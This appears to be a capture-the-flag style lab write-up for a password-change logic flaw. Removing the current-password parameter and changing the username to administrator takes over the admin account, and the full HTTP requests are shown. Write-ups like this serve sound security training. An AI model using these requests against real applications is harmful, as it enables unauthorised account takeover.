## Weak isolation on dual-use endpoint

This lab makes a flawed assumption about the user's privilege level based on their input. As a result, you can exploit the logic of its account management features to gain access to arbitrary users' accounts. To solve the lab, access the administrator account and delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

## Notes

- /admin
- /login
- Password change feature

1. Login with your account
2. Change your password normally
3. Remove the \`current-password\` parameter
4. Change the \`username\` parameter to \`administrator\`
5. Change administrator password
6. Login as administrator
7. Delete \`carlos\`

## Solve

Login with your account and go to the password change functionality. Change your password once normally and intercept the request in Burp.

Send the request to Repeater:

```
POST /my-account/change-password HTTP/2
Host: 0a2f008e041d53ac80a13fd200350042.web-security-academy.net
Cookie: session=UKZR8MAf3T4nIPQxC21pKLb3wb7U8Yyg
Content-Type: application/x-www-form-urlencoded

username=wiener&current-password=peter&new-password-1=test&new-password-2=test
```

Notice that the application normally requires the \`current-password\` parameter.

Remove the parameter completely:

```http
POST /my-account/change-password HTTP/2
Host: 0a2f008e041d53ac80a13fd200350042.web-security-academy.net
Cookie: session=UKZR8MAf3T4nIPQxC21pKLb3wb7U8Yyg
Content-Type: application/x-www-form-urlencoded

username=wiener&new-password-1=test&new-password-2=test
```

The password is still successfully changed even without providing the current password.

Now modify the \`username\` parameter and target the administrator account:

```http
POST /my-account/change-password HTTP/2
Host: 0a2f008e041d53ac80a13fd200350042.web-security-academy.net
Cookie: session=UKZR8MAf3T4nIPQxC21pKLb3wb7U8Yyg
Content-Type: application/x-www-form-urlencoded

username=administrator&new-password-1=test&new-password-2=test
```

The administrator password is updated successfully.

Logout from your current account and login using:

```text
administrator:test
```

Once authenticated, access the admin panel and delete the user \`carlos\` to solve the lab.